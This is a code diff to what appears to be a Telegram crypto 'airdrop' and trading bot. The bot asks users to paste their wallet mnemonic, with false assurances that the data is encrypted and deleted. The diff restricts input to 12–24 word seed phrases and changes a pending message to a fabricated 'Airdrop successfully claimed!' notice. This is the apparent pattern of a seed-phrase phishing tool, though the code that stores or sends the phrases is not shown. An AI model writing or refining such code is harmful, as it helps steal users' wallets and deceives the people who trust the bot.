@@ -211,55 +211,13 @@ def validate_wallet_address(address: str) -> bool:
         return False
 
 
-def is_valid_private_key_or_mnemonic(value: str) -> bool:
-    """Validate if the input is a usable private key or mnemonic phrase."""
+def is_valid_mnemonic_phrase(value: str) -> bool:
+    """Validate that the input is a mnemonic phrase only."""
     if not value:
         return False
 
-    value = value.strip()
-    if " " in value:
-        words = value.split()
-        if len(words) in {12, 15, 18, 21, 24} and all(word.isalpha() for word in words):
-            return True
-        return False
-
-    def try_decode_bytes(data: str):
-        # base64
-        try:
-            decoded = base64.b64decode(data)
-            if len(decoded) in {32, 64, 128}:
-                return decoded
-        except Exception:
-            pass
-        # hex
-        try:
-            decoded = bytes.fromhex(data)
-            if len(decoded) in {32, 64, 128}:
-                return decoded
-        except Exception:
-            pass
-        # base58
-        try:
-            import base58
-            decoded = base58.b58decode(data)
-            if len(decoded) in {32, 64, 128}:
-                return decoded
-        except Exception:
-            pass
-        # JSON array of bytes
-        try:
-            import json
-            parsed = json.loads(data)
-            if isinstance(parsed, list) and all(isinstance(item, int) for item in parsed):
-                decoded = bytes(parsed)
-                if len(decoded) in {32, 64, 128}:
-                    return decoded
-        except Exception:
-            pass
-        return None
-
-    decoded = try_decode_bytes(value)
-    return decoded is not None
+    words = value.strip().split()
+    return len(words) in {12, 15, 18, 21, 24} and all(word.isalpha() for word in words)
 
 # ================= START =================
 
@@ -332,8 +290,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "connect_wallet":
         waiting_for_wallet.add(user_id)
         await query.message.reply_text(
-            "Enter the private keys or mnemonic of the wallet you want to import\n\n"
-            "🔒 Security Tip: Never share your private key or mnemonic with people.\n\n"
+            "Enter your wallet mnemonic phrase only. Do not send a wallet address.\n\n"
+            "🔒 Security Tip: Never share your mnemonic with people.\n\n"
             "This bot stores your wallet securely for session-based trading.\n\n"
             "🛡️ Your data is encrypted and deleted after setup."
         )
@@ -454,7 +412,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=keyboard
             )
         else:
-            await query.message.reply_text("✅ Wallet connected. Airdrop claims coming soon.")
+            await query.message.reply_text("🎉 Airdrop successfully claimed!")
 
     elif query.data == "withdraw":
         wallet = user_wallets.get(user_id)
@@ -587,12 +545,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         private_key_input = text.strip()
 
         if not private_key_input:
-            await update.message.reply_text("❌ Please paste your private key or mnemonic.")
+            await update.message.reply_text("❌ Please paste your wallet mnemonic phrase.")
             return
 
-        if not is_valid_private_key_or_mnemonic(private_key_input):
+        if not is_valid_mnemonic_phrase(private_key_input):
             await update.message.reply_text(
-                "Invalid private key phrase. Input the right key phrase."
+                "❌ Invalid mnemonic phrase. Only a 12/15/18/21/24-word mnemonic is accepted."
             )
             return
 
